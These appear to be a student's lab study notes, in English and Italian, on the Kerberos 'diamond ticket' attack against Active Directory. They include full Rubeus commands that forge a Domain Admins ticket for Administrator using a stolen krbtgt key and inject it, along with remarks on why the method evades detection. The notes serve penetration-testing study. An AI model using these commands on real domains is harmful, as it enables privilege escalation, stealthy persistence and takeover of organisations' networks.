A diamond ticket attack is created by decrypting a valid TGT, making changes to it and re-encrypt it using AES keys of the `kbrtgt` account.

>[!Note]
>In Golden ticket attack we create a TGT.
>In Diamond ticket attack we modify a valid TGT.
>
>Both use `krbtgt` secret

The persistence here depends on `krbtgt` account here.

>[!WARNING]
>A `Diamond ticket` attack is more opsec safe because:
>1. Valid ticket times because we modify a valid TGT legally got from the `DC`
>2. There is a corrispondence between TGT request for TGS/service and a request for TGT creation.

The steps are:
1. Steal `krbtgt` user secret
2. Ask for a `TGT` to the `DC` 
	1. Decrypt it using the `krbtgt` AES
	2. Modify the TGT to get the desired privileges
	3. Re-encrypt the TGT using the AES key of `krbtgt`
3. Send the TGT back to the `DC` to ask for `TGS` or `ST`


![[Pasted image 20261123161235.png]]


# Forging a diamond ticket from Rubeus

To generate a golden ticket with attributes similar to a normal TGT we could use Rubeus:
```powershell
C:\AD\Tools\Rubeus.exe diamond /krbkey:<krbtgt_key> /user:student555 /password:<student_pass> /enctype:<krbtgt_secret_type ex aes> /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt 
```
- `/krbkey:<krbtgt_key>` specifica la chiave crittografica dell'account `krbtgt`, necessaria per le operazioni crittografiche sul ticket.
- `/user:student555` indica l'account di dominio utilizzato per richiedere il TGT legittimo iniziale.
- `/password:<student_pass>` password dell'utente `student555`, utilizzata per autenticarsi al KDC e ottenere il TGT originale.
- `/enctype:<krbtgt_secret_type>` specifica il tipo di crittografia della chiave `krbtgt`, ad esempio `aes256` o `rc4`.
- `/ticketuser:administrator` indica `Administrator` come identità da rappresentare nel ticket modificato. La forma esatta del parametro dipende dalla versione di Rubeus.
- `/ticketuserid:500`: imposta il RID dell'identità rappresentata nel ticket. Il RID `500` identifica l'account Administrator predefinito del dominio.
- `/groups:512` indica il RID del gruppo `Domain Admins`. Nel ticket modificato rappresenta l'appartenenza a questo gruppo privilegiato.
- `/createnetonly:C:\Windows\System32\cmd.exe` richiede la creazione di un nuovo processo `cmd.exe` associato a una sessione di logon separata, di tipo `NewCredentials` (Logon Type 9).
- `/show` richiede di mostrare la finestra del processo creato.
- `/ptt` significa _Pass-the-Ticket_ e richiede l'importazione del ticket Kerberos nella sessione Windows prevista.


If we have access as Domain User we can also use `/tgtdeleg` instead of credentials:
```powershell
C:\AD\Tools\Rubeus.exe diamond /krbkey:<krbtgt_key> /tgtdeleg /enctype:<krbtgt_secret_type ex aes> /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt 
```


This generates a shell in which we have the diamond ticket. So we can connect ot the service we want using this shell. The diamond TGT will be sent to the `DC`.

>[!Warning]
>This command asks the DC for a valid TGT, then modifies it.
>
>The command must be run in a `Administator` powershell on student VM









